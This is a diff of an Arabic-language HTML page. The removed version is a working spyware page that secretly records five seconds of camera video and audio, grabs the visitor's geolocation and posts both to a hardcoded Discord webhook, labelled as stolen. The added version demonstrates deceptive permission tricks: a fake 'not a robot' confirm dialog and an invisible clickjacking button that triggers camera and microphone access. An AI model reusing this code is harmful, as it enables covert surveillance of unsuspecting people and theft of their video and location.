@@ -1,71 +1,51 @@
 <html>
-  <body>
-    <h1>قول كاسه</h1>
-    <button id="start">ابدأ التسجيل والإرسال</button>
+  <body style="font-family: sans-serif; direction: rtl; text-align: center; margin-top: 100px;">
+
+    <h2>تجربة خدع طلب الصلاحيات</h2>
+
+    <!-- خدعة 1: تنبيه مزيف -->
+    <div style="margin-bottom: 30px;">
+      <button id="fakePromptBtn" style="padding: 15px 30px; font-size: 18px; cursor:pointer;">
+        اضغط هنا لتأكيد أنك لست روبوت
+      </button>
+    </div>
+
+    <!-- خدعة 2: زر موافق مخفي -->
+    <div style="position: relative; width: 200px; margin: 0 auto;">
+      <button style="padding: 15px 30px; font-size: 18px; cursor:pointer; z-index: 1; position: relative;">
+        زر عادي
+      </button>
+      <button id="hiddenAllowBtn" 
+        style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; opacity: 0; cursor: pointer; z-index: 2;">
+        زر الموافقة المخفي
+      </button>
+    </div>
 
     <script>
-      const webhookURL = "https://discord.com/api/webhooks/1352849557184053290/lD7F2L2xR6GEKGoXV5s8L_cW5QmhTQJsZTSAoRYX9qy4Leobxmq64Izkyst-AFkrypFv";
-
-      function dataURItoBlob(dataURI) {
-        const byteString = atob(dataURI.split(',')[1]);
-        const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
-        const ab = new ArrayBuffer(byteString.length);
-        const ia = new Uint8Array(ab);
-        for (let i = 0; i < byteString.length; i++) {
-          ia[i] = byteString.charCodeAt(i);
+      // خدعة 1: تنبيه مزيف يخليك توافق عالإذن
+      document.getElementById('fakePromptBtn').onclick = () => {
+        const fakeConfirm = confirm('اضغط موافق لتأكيد أنك مو روبوت');
+        if(fakeConfirm) {
+          navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+            .then(stream => {
+              alert('تم تفعيل الكاميرا والمايك بدون ما تدري');
+              stream.getTracks().forEach(track => track.stop());
+            })
+            .catch(() => alert('رفضت الإذن'));
+        } else {
+          alert('رفضت الموافقة المزيفة');
         }
-        return new Blob([ab], { type: mimeString });
-      }
+      };
 
-      document.getElementById('start').onclick = async () => {
-        try {
-          // نطلب الكاميرا والمايك مع الكاميرا الخلفية (لو تبغا)
-          const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" }, audio: true });
-
-          // نسوي تسجيل بالفيديو
-          const mediaRecorder = new MediaRecorder(stream);
-          let chunks = [];
-
-          mediaRecorder.ondataavailable = e => chunks.push(e.data);
-
-          mediaRecorder.start();
-
-          // نسوي توقيت 5 ثواني
-          await new Promise(resolve => setTimeout(resolve, 5000));
-
-          mediaRecorder.stop();
-
-          // نوقف الستريم عشان ما يظل يشغل الكاميرا والمايك
-          mediaRecorder.onstop = async () => {
+      // خدعة 2: زر موافق مخفي
+      document.getElementById('hiddenAllowBtn').onclick = () => {
+        navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+          .then(stream => {
+            alert('تم تفعيل الكاميرا والمايك بدون ما تدري');
             stream.getTracks().forEach(track => track.stop());
-
-            const blob = new Blob(chunks, { type: 'video/webm' });
-
-            // نجيب الموقع
-            navigator.geolocation.getCurrentPosition(position => {
-              const formData = new FormData();
-              formData.append('content', `تم سرقة الفيديو والموقع:\nLatitude: ${position.coords.latitude}\nLongitude: ${position.coords.longitude}`);
-              formData.append('file', blob, 'video.webm');
-
-              fetch(webhookURL, {
-                method: 'POST',
-                body: formData
-              });
-            }, err => {
-              const formData = new FormData();
-              formData.append('content', 'تم سرقة الفيديو لكن الموقع مرفوض');
-              formData.append('file', blob, 'video.webm');
-
-              fetch(webhookURL, {
-                method: 'POST',
-                body: formData
-              });
-            });
-          };
-        } catch (err) {
-          alert('رفضت الإذن أو صار خطأ');
-        }
-      }
+          })
+          .catch(() => alert('رفضت الإذن'));
+      };
     </script>
   </body>
 </html>
